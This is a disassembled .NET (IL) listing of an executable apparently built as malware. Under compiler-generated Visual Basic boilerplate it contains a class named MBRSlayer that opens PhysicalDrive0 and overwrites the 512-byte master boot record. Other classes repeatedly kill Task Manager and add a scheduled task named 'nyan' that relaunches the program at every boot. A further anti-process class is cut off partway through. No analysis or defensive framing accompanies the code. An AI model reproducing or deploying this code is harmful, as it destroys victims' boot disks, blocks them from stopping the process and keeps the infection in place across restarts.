
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.6.1055.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern kernel32
.module extern user32.dll
.module extern kernel32.dll
.module extern wintrust.dll
.module extern avicap32.dll
.module extern KERNEL32.DLL
.module extern winmm.dll
.module extern gdi32.dll
.module extern gdi32
.module extern ntdll
.module extern user32
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly Application
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 02 00 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 31 46 38 42 32 32 37 31 2D 37 33 30 33   // ..$1F8B2271-7303
                                                                                                  2D 34 46 32 46 2D 38 42 34 42 2D 35 35 36 41 35   // -4F2F-8B4B-556A5
                                                                                                  46 43 42 33 43 38 36 00 00 )                      // FCB3C86..
  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 31 2E 30 2E 30 2E 30 00 00 )             // ...1.0.0.0..
  .hash algorithm 0x00008004
  .ver 1:0:0:0
}
.module Application.exe
// MVID: {E0F48768-A66F-41D0-A440-6E6AD23E6C3D}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x001C0000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase::.ctor()
    IL_0006:  ret
  } // end of method MyApplication::.ctor

} // end of class My.MyApplication

.class private auto ansi My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0006:  ret
  } // end of method MyComputer::.ctor

} // end of class My.MyComputer

.class private auto ansi sealed beforefieldinit My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 08 31 31   // ...MyTemplate.11
                                                                                                  2E 30 2E 30 2E 30 00 00 )                         // .0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public hidebysig strict virtual 
            instance bool  Equals(object o) cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       13 (0xd)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0007:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000c:  ret
    } // end of method MyWebServices::Equals

    .method public hidebysig strict virtual 
            instance int32  GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0006:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       11 (0xb)
      .maxstack  8
      IL_0000:  ldtoken    My.MyProject/MyWebServices
      IL_0005:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000a:  ret
    } // end of method MyWebServices::GetType

    .method public hidebysig strict virtual 
            instance string  ToString() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance string [mscorlib]System.Object::ToString()
      IL_0006:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       20 (0x14)
      .maxstack  1
      .locals init (!!T V_0)
      IL_0000:  ldarg.0
      IL_0001:  box        !!T
      IL_0006:  brtrue.s   IL_0010

      IL_0008:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_000d:  stloc.0
      IL_000e:  br.s       IL_0012

      IL_0010:  ldarg.0
      IL_0011:  stloc.0
      IL_0012:  ldloc.0
      IL_0013:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       8 (0x8)
      .maxstack  8
      IL_0000:  ldarg.1
      IL_0001:  initobj    !!T
      IL_0007:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       28 (0x1c)
      .maxstack  8
      IL_0000:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0005:  box        !T
      IL_000a:  brtrue.s   IL_0016

      IL_000c:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0011:  stsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0016:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001b:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> m_AppObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  8
    IL_0000:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::.ctor()
    IL_0005:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::.ctor()
    IL_000f:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_WebServices

  .property class My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class My.MyComputer My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class My.MyApplication My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User My.MyProject::get_User()
  } // end of property MyProject::User
  .property class My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class My.MyProject/MyWebServices My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class My.MyProject

.class public auto ansi Stub.MBRSlayer
       extends [mscorlib]System.Object
{
  .field private static literal uint32 GenericWrite = uint32(0x40000000)
  .field private static literal uint32 GenericExecute = uint32(0x20000000)
  .field private static literal uint32 GenericAll = uint32(0x10000000)
  .field private static literal uint32 FileShareRead = uint32(0x00000001)
  .field private static literal uint32 FileShareWrite = uint32(0x00000002)
  .field private static literal uint32 OpenExisting = uint32(0x00000003)
  .field private static literal uint32 FileFlagDeleteOnClose = uint32(0x40000000)
  .field private static literal uint32 MbrSize = uint32(0x00000200)
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method MBRSlayer::.ctor

  .method public static pinvokeimpl("kernel32" winapi) 
          native int  CreateFile(string lpFileName,
                                 uint32 dwDesiredAccess,
                                 uint32 dwShareMode,
                                 native int lpSecurityAttributes,
                                 uint32 dwCreationDisposition,
                                 uint32 dwFlagsAndAttributes,
                                 native int hTemplateFile) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32" winapi) 
          bool  WriteFile(native int hfile,
                          uint8[] lpBuffer,
                          uint32 nNumberOfBytesToWrite,
                          [out] uint32& lpNumberBytesWritten,
                          native int lpOverlapped) cil managed preservesig
  {
  }
  .method public static void  Start() cil managed
  {
    // Code size       234 (0xea)
    .maxstack  7
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2,
             object V_3,
             object V_4,
             uint32 V_5,
             native int V_6)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.0
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.2
      IL_0009:  ldc.i4     0x200
      IL_000e:  newarr     [mscorlib]System.Byte
      IL_0013:  dup
      IL_0014:  ldtoken    field valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=512' '<PrivateImplementationDetails>'::F4302D72A369C8BADBF2BE9C2854DF4529637155
      IL_0019:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                          valuetype [mscorlib]System.RuntimeFieldHandle)
      IL_001e:  stloc.3
      IL_001f:  ldc.i4.3
      IL_0020:  stloc.2
      IL_0021:  ldstr      "\\\\.\\PhysicalDrive0"
      IL_0026:  ldc.i4     0x10000000
      IL_002b:  ldc.i4.3
      IL_002c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0031:  ldc.i4.3
      IL_0032:  ldc.i4.0
      IL_0033:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0038:  call       native int Stub.MBRSlayer::CreateFile(string,
                                                                 uint32,
                                                                 uint32,
                                                                 native int,
                                                                 uint32,
                                                                 uint32,
                                                                 native int)
      IL_003d:  box        [mscorlib]System.IntPtr
      IL_0042:  stloc.s    V_4
      IL_0044:  ldc.i4.4
      IL_0045:  stloc.2
      IL_0046:  ldc.i4.0
      IL_0047:  stloc.s    V_5
      IL_0049:  ldc.i4.5
      IL_004a:  stloc.2
      IL_004b:  ldloc.s    V_4
      IL_004d:  dup
      IL_004e:  brtrue.s   IL_005d

      IL_0050:  pop
      IL_0051:  ldloca.s   V_6
      IL_0053:  initobj    [mscorlib]System.IntPtr
      IL_0059:  ldloc.s    V_6
      IL_005b:  br.s       IL_0062

      IL_005d:  unbox.any  [mscorlib]System.IntPtr
      IL_0062:  ldloc.3
      IL_0063:  castclass  uint8[]
      IL_0068:  ldc.i4     0x200
      IL_006d:  ldloca.s   V_5
      IL_006f:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0074:  call       bool Stub.MBRSlayer::WriteFile(native int,
                                                          uint8[],
                                                          uint32,
                                                          uint32&,
                                                          native int)
      IL_0079:  pop
      IL_007a:  leave.s    IL_00e1

      IL_007c:  ldloc.1
      IL_007d:  ldc.i4.1
      IL_007e:  add
      IL_007f:  ldc.i4.0
      IL_0080:  stloc.1
      IL_0081:  switch     ( 
                            IL_00a2,
                            IL_0000,
                            IL_0007,
                            IL_001f,
                            IL_0044,
                            IL_0049,
                            IL_007a)
      IL_00a2:  leave.s    IL_00d6

      IL_00a4:  ldloc.2
      IL_00a5:  stloc.1
      IL_00a6:  ldloc.0
      IL_00a7:  switch     ( 
                            IL_00b4,
                            IL_007c)
      IL_00b4:  leave.s    IL_00d6

    }  // end .try
    filter
    {
      IL_00b6:  isinst     [mscorlib]System.Exception
      IL_00bb:  ldnull
      IL_00bc:  cgt.un
      IL_00be:  ldloc.0
      IL_00bf:  ldc.i4.0
      IL_00c0:  cgt.un
      IL_00c2:  and
      IL_00c3:  ldloc.1
      IL_00c4:  ldc.i4.0
      IL_00c5:  ceq
      IL_00c7:  and
      IL_00c8:  endfilter
    }  // end filter
    {  // handler
      IL_00ca:  castclass  [mscorlib]System.Exception
      IL_00cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d4:  leave.s    IL_00a4

    }  // end handler
    IL_00d6:  ldc.i4     0x800a0033
    IL_00db:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_00e0:  throw

    IL_00e1:  ldloc.1
    IL_00e2:  brfalse.s  IL_00e9

    IL_00e4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_00e9:  ret
  } // end of method MBRSlayer::Start

} // end of class Stub.MBRSlayer

.class public auto ansi Stub.NoTsk
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method NoTsk::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed
  {
    // Code size       52 (0x34)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [System]System.Diagnostics.Process[] V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  ldstr      "taskmgr"
    IL_0005:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_000a:  stloc.1
    IL_000b:  ldc.i4.0
    IL_000c:  stloc.2
    IL_000d:  br.s       IL_002d

    IL_000f:  ldloc.1
    IL_0010:  ldloc.2
    IL_0011:  ldelem.ref
    IL_0012:  stloc.0
    .try
    {
      IL_0013:  ldloc.0
      IL_0014:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0019:  leave.s    IL_0029

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001b:  dup
      IL_001c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0021:  stloc.3
      IL_0022:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0027:  leave.s    IL_0029

    }  // end handler
    IL_0029:  ldloc.2
    IL_002a:  ldc.i4.1
    IL_002b:  add.ovf
    IL_002c:  stloc.2
    IL_002d:  ldloc.2
    IL_002e:  ldloc.1
    IL_002f:  ldlen
    IL_0030:  conv.i4
    IL_0031:  blt.s      IL_000f

    IL_0033:  ret
  } // end of method NoTsk::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     250.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_0013:  ldsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_0018:  ldnull
    IL_0019:  ldftn      void Stub.NoTsk::Handler(object,
                                                  class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer Stub.NoTsk::Timer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method NoTsk::Start

} // end of class Stub.NoTsk

.class private auto ansi sealed Persistence
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .method public static void  Startup() cil managed
  {
    // Code size       52 (0x34)
    .maxstack  4
    .locals init (object V_0)
    IL_0000:  ldsfld     string j.OK::DR
    IL_0005:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_000a:  ldstr      "\\"
    IL_000f:  ldsfld     string j.OK::EXE
    IL_0014:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0019:  stloc.0
    IL_001a:  ldstr      "schtasks /create /sc onstart /mo 1 /tn nyan /tr "
    IL_001f:  ldloc.0
    IL_0020:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0025:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_002a:  ldc.i4.0
    IL_002b:  ldc.i4.0
    IL_002c:  ldc.i4.m1
    IL_002d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_0032:  pop
    IL_0033:  ret
  } // end of method Persistence::Startup

} // end of class Persistence

.class public auto ansi beforefieldinit MyAntiProcess
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer Timer
  .field private static class j.OK N
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       11 (0xb)
    .maxstack  8
    IL_0000:  newobj     instance void j.OK::.ctor()
